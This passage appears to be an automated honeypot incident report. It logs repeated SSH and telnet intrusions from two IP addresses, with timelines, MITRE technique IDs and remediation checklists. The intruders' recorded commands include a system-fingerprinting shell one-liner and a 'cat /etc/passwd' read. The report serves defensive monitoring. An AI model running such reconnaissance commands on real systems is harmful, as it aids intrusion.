**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7c1e4718cde

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:09 |
| **Last Seen** | 2026-08-26 15:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:09:55` | `cowrie.session.connect` |
| `2026-08-26 15:09:55` | `cowrie.client.version` |
| `2026-08-26 15:09:55` | `cowrie.client.kex` |
| `2026-08-26 15:09:57` | `cowrie.login.success` |
| `2026-08-26 15:09:58` | `cowrie.session.params` |
| `2026-08-26 15:09:58` | `cowrie.command.input` |
| `2026-08-26 15:09:58` | `cowrie.command.input` |
| `2026-08-26 15:09:58` | `cowrie.command.input` |
| `2026-08-26 15:09:58` | `cowrie.command.input` |
| `2026-08-26 15:09:58` | `cowrie.command.input` |
| `2026-08-26 15:09:58` | `cowrie.command.success` |
| `2026-08-26 15:09:58` | `cowrie.command.input` |
| `2026-08-26 15:09:58` | `cowrie.command.input` |
| `2026-08-26 15:09:58` | `cowrie.command.input` |
| `2026-08-26 15:09:58` | `cowrie.command.input` |
| `2026-08-26 15:09:59` | `cowrie.log.closed` |
| `2026-08-26 15:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffe82362ce13

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:11 |
| **Last Seen** | 2026-08-26 15:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:11:32` | `cowrie.session.connect` |
| `2026-08-26 15:11:32` | `cowrie.client.version` |
| `2026-08-26 15:11:32` | `cowrie.client.kex` |
| `2026-08-26 15:11:34` | `cowrie.login.success` |
| `2026-08-26 15:11:36` | `cowrie.session.params` |
| `2026-08-26 15:11:36` | `cowrie.command.input` |
| `2026-08-26 15:11:36` | `cowrie.command.input` |
| `2026-08-26 15:11:36` | `cowrie.command.input` |
| `2026-08-26 15:11:36` | `cowrie.command.input` |
| `2026-08-26 15:11:36` | `cowrie.command.input` |
| `2026-08-26 15:11:36` | `cowrie.command.success` |
| `2026-08-26 15:11:36` | `cowrie.command.input` |
| `2026-08-26 15:11:36` | `cowrie.command.input` |
| `2026-08-26 15:11:36` | `cowrie.command.input` |
| `2026-08-26 15:11:36` | `cowrie.command.input` |
| `2026-08-26 15:11:37` | `cowrie.log.closed` |
| `2026-08-26 15:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aabe187c917a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:13 |
| **Last Seen** | 2026-08-26 15:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:13:13` | `cowrie.session.connect` |
| `2026-08-26 15:13:13` | `cowrie.client.version` |
| `2026-08-26 15:13:13` | `cowrie.client.kex` |
| `2026-08-26 15:13:14` | `cowrie.login.success` |
| `2026-08-26 15:13:15` | `cowrie.session.params` |
| `2026-08-26 15:13:15` | `cowrie.command.input` |
| `2026-08-26 15:13:15` | `cowrie.command.input` |
| `2026-08-26 15:13:15` | `cowrie.command.input` |
| `2026-08-26 15:13:15` | `cowrie.command.input` |
| `2026-08-26 15:13:15` | `cowrie.command.input` |
| `2026-08-26 15:13:15` | `cowrie.command.success` |
| `2026-08-26 15:13:15` | `cowrie.command.input` |
| `2026-08-26 15:13:15` | `cowrie.command.input` |
| `2026-08-26 15:13:15` | `cowrie.command.input` |
| `2026-08-26 15:13:15` | `cowrie.command.input` |
| `2026-08-26 15:13:16` | `cowrie.log.closed` |
| `2026-08-26 15:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-632a5acfd867

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:14 |
| **Last Seen** | 2026-08-26 15:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:14:51` | `cowrie.session.connect` |
| `2026-08-26 15:14:52` | `cowrie.client.version` |
| `2026-08-26 15:14:52` | `cowrie.client.kex` |
| `2026-08-26 15:14:54` | `cowrie.login.success` |
| `2026-08-26 15:14:56` | `cowrie.session.params` |
| `2026-08-26 15:14:56` | `cowrie.command.input` |
| `2026-08-26 15:14:56` | `cowrie.command.input` |
| `2026-08-26 15:14:56` | `cowrie.command.input` |
| `2026-08-26 15:14:56` | `cowrie.command.input` |
| `2026-08-26 15:14:56` | `cowrie.command.input` |
| `2026-08-26 15:14:56` | `cowrie.command.success` |
| `2026-08-26 15:14:56` | `cowrie.command.input` |
| `2026-08-26 15:14:56` | `cowrie.command.input` |
| `2026-08-26 15:14:56` | `cowrie.command.input` |
| `2026-08-26 15:14:56` | `cowrie.command.input` |
| `2026-08-26 15:14:57` | `cowrie.log.closed` |
| `2026-08-26 15:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2200c8b13901

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:16 |
| **Last Seen** | 2026-08-26 15:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:16:27` | `cowrie.session.connect` |
| `2026-08-26 15:16:28` | `cowrie.client.version` |
| `2026-08-26 15:16:28` | `cowrie.client.kex` |
| `2026-08-26 15:16:30` | `cowrie.login.success` |
| `2026-08-26 15:16:31` | `cowrie.session.params` |
| `2026-08-26 15:16:31` | `cowrie.command.input` |
| `2026-08-26 15:16:31` | `cowrie.command.input` |
| `2026-08-26 15:16:31` | `cowrie.command.input` |
| `2026-08-26 15:16:31` | `cowrie.command.input` |
| `2026-08-26 15:16:31` | `cowrie.command.input` |
| `2026-08-26 15:16:31` | `cowrie.command.success` |
| `2026-08-26 15:16:31` | `cowrie.command.input` |
| `2026-08-26 15:16:31` | `cowrie.command.input` |
| `2026-08-26 15:16:31` | `cowrie.command.input` |
| `2026-08-26 15:16:31` | `cowrie.command.input` |
| `2026-08-26 15:16:32` | `cowrie.log.closed` |
| `2026-08-26 15:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00523eae5204

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:18 |
| **Last Seen** | 2026-08-26 15:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:18:01` | `cowrie.session.connect` |
| `2026-08-26 15:18:02` | `cowrie.client.version` |
| `2026-08-26 15:18:02` | `cowrie.client.kex` |
| `2026-08-26 15:18:05` | `cowrie.login.success` |
| `2026-08-26 15:18:08` | `cowrie.session.params` |
| `2026-08-26 15:18:08` | `cowrie.command.input` |
| `2026-08-26 15:18:08` | `cowrie.command.input` |
| `2026-08-26 15:18:08` | `cowrie.command.input` |
| `2026-08-26 15:18:08` | `cowrie.command.input` |
| `2026-08-26 15:18:08` | `cowrie.command.input` |
| `2026-08-26 15:18:08` | `cowrie.command.success` |
| `2026-08-26 15:18:08` | `cowrie.command.input` |
| `2026-08-26 15:18:08` | `cowrie.command.input` |
| `2026-08-26 15:18:08` | `cowrie.command.input` |
| `2026-08-26 15:18:08` | `cowrie.command.input` |
| `2026-08-26 15:18:08` | `cowrie.log.closed` |
| `2026-08-26 15:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cdd231c1ca6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:19 |
| **Last Seen** | 2026-08-26 15:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:19:37` | `cowrie.session.connect` |
| `2026-08-26 15:19:38` | `cowrie.client.version` |
| `2026-08-26 15:19:38` | `cowrie.client.kex` |
| `2026-08-26 15:19:40` | `cowrie.login.success` |
| `2026-08-26 15:19:42` | `cowrie.session.params` |
| `2026-08-26 15:19:42` | `cowrie.command.input` |
| `2026-08-26 15:19:42` | `cowrie.command.input` |
| `2026-08-26 15:19:42` | `cowrie.command.input` |
| `2026-08-26 15:19:42` | `cowrie.command.input` |
| `2026-08-26 15:19:42` | `cowrie.command.input` |
| `2026-08-26 15:19:42` | `cowrie.command.success` |
| `2026-08-26 15:19:42` | `cowrie.command.input` |
| `2026-08-26 15:19:42` | `cowrie.command.input` |
| `2026-08-26 15:19:42` | `cowrie.command.input` |
| `2026-08-26 15:19:42` | `cowrie.command.input` |
| `2026-08-26 15:19:42` | `cowrie.log.closed` |
| `2026-08-26 15:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-595e80225ddc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:21 |
| **Last Seen** | 2026-08-26 15:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:21:16` | `cowrie.session.connect` |
| `2026-08-26 15:21:17` | `cowrie.client.version` |
| `2026-08-26 15:21:17` | `cowrie.client.kex` |
| `2026-08-26 15:21:18` | `cowrie.login.success` |
| `2026-08-26 15:21:19` | `cowrie.session.params` |
| `2026-08-26 15:21:19` | `cowrie.command.input` |
| `2026-08-26 15:21:19` | `cowrie.command.input` |
| `2026-08-26 15:21:19` | `cowrie.command.input` |
| `2026-08-26 15:21:19` | `cowrie.command.input` |
| `2026-08-26 15:21:19` | `cowrie.command.input` |
| `2026-08-26 15:21:19` | `cowrie.command.success` |
| `2026-08-26 15:21:19` | `cowrie.command.input` |
| `2026-08-26 15:21:19` | `cowrie.command.input` |
| `2026-08-26 15:21:19` | `cowrie.command.input` |
| `2026-08-26 15:21:19` | `cowrie.command.input` |
| `2026-08-26 15:21:20` | `cowrie.log.closed` |
| `2026-08-26 15:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3286a2c73d1a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:23 |
| **Last Seen** | 2026-08-26 15:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:23:08` | `cowrie.session.connect` |
| `2026-08-26 15:23:09` | `cowrie.client.version` |
| `2026-08-26 15:23:09` | `cowrie.client.kex` |
| `2026-08-26 15:23:09` | `cowrie.login.success` |
| `2026-08-26 15:23:10` | `cowrie.session.params` |
| `2026-08-26 15:23:10` | `cowrie.command.input` |
| `2026-08-26 15:23:10` | `cowrie.command.input` |
| `2026-08-26 15:23:10` | `cowrie.command.input` |
| `2026-08-26 15:23:10` | `cowrie.command.input` |
| `2026-08-26 15:23:10` | `cowrie.command.input` |
| `2026-08-26 15:23:10` | `cowrie.command.success` |
| `2026-08-26 15:23:10` | `cowrie.command.input` |
| `2026-08-26 15:23:10` | `cowrie.command.input` |
| `2026-08-26 15:23:10` | `cowrie.command.input` |
| `2026-08-26 15:23:10` | `cowrie.command.input` |
| `2026-08-26 15:23:11` | `cowrie.log.closed` |
| `2026-08-26 15:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c79205e32dd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:25 |
| **Last Seen** | 2026-08-26 15:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:25:29` | `cowrie.session.connect` |
| `2026-08-26 15:25:29` | `cowrie.client.version` |
| `2026-08-26 15:25:29` | `cowrie.client.kex` |
| `2026-08-26 15:25:29` | `cowrie.login.success` |
| `2026-08-26 15:25:30` | `cowrie.session.params` |
| `2026-08-26 15:25:30` | `cowrie.command.input` |
| `2026-08-26 15:25:30` | `cowrie.command.input` |
| `2026-08-26 15:25:30` | `cowrie.command.input` |
| `2026-08-26 15:25:30` | `cowrie.command.input` |
| `2026-08-26 15:25:30` | `cowrie.command.input` |
| `2026-08-26 15:25:30` | `cowrie.command.success` |
| `2026-08-26 15:25:30` | `cowrie.command.input` |
| `2026-08-26 15:25:30` | `cowrie.command.input` |
| `2026-08-26 15:25:30` | `cowrie.command.input` |
| `2026-08-26 15:25:30` | `cowrie.command.input` |
| `2026-08-26 15:25:30` | `cowrie.log.closed` |
| `2026-08-26 15:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-725995ca919c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:28 |
| **Last Seen** | 2026-08-26 15:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:28:40` | `cowrie.session.connect` |
| `2026-08-26 15:28:40` | `cowrie.client.version` |
| `2026-08-26 15:28:40` | `cowrie.client.kex` |
| `2026-08-26 15:28:42` | `cowrie.login.success` |
| `2026-08-26 15:28:43` | `cowrie.session.params` |
| `2026-08-26 15:28:43` | `cowrie.command.input` |
| `2026-08-26 15:28:43` | `cowrie.command.input` |
| `2026-08-26 15:28:43` | `cowrie.command.input` |
| `2026-08-26 15:28:43` | `cowrie.command.input` |
| `2026-08-26 15:28:43` | `cowrie.command.input` |
| `2026-08-26 15:28:43` | `cowrie.command.success` |
| `2026-08-26 15:28:43` | `cowrie.command.input` |
| `2026-08-26 15:28:43` | `cowrie.command.input` |
| `2026-08-26 15:28:43` | `cowrie.command.input` |
| `2026-08-26 15:28:43` | `cowrie.command.input` |
| `2026-08-26 15:28:43` | `cowrie.log.closed` |
| `2026-08-26 15:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cb253a52af6

| Field | Detail |
|---|---|
| **Source IP** | `23.147.232[.]237` |
| **First Seen** | 2026-08-26 15:29 |
| **Last Seen** | 2026-08-26 15:30 |
| **Session Duration** | 65s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:29:33` | `cowrie.session.connect` |
| `2026-08-26 15:29:35` | `cowrie.telnet.option` |
| `2026-08-26 15:29:36` | `cowrie.telnet.option` |
| `2026-08-26 15:29:36` | `cowrie.login.success` |
| `2026-08-26 15:29:37` | `cowrie.session.params` |
| `2026-08-26 15:29:37` | `cowrie.telnet.option` |
| `2026-08-26 15:29:37` | `cowrie.telnet.option` |
| `2026-08-26 15:29:37` | `cowrie.command.input` |
| `2026-08-26 15:29:37` | `cowrie.command.input` |
| `2026-08-26 15:29:37` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.failed` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.failed` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.failed` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.failed` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.failed` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.failed` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.failed` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.failed` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:29:38` | `cowrie.command.input` |
| `2026-08-26 15:30:39` | `cowrie.log.closed` |
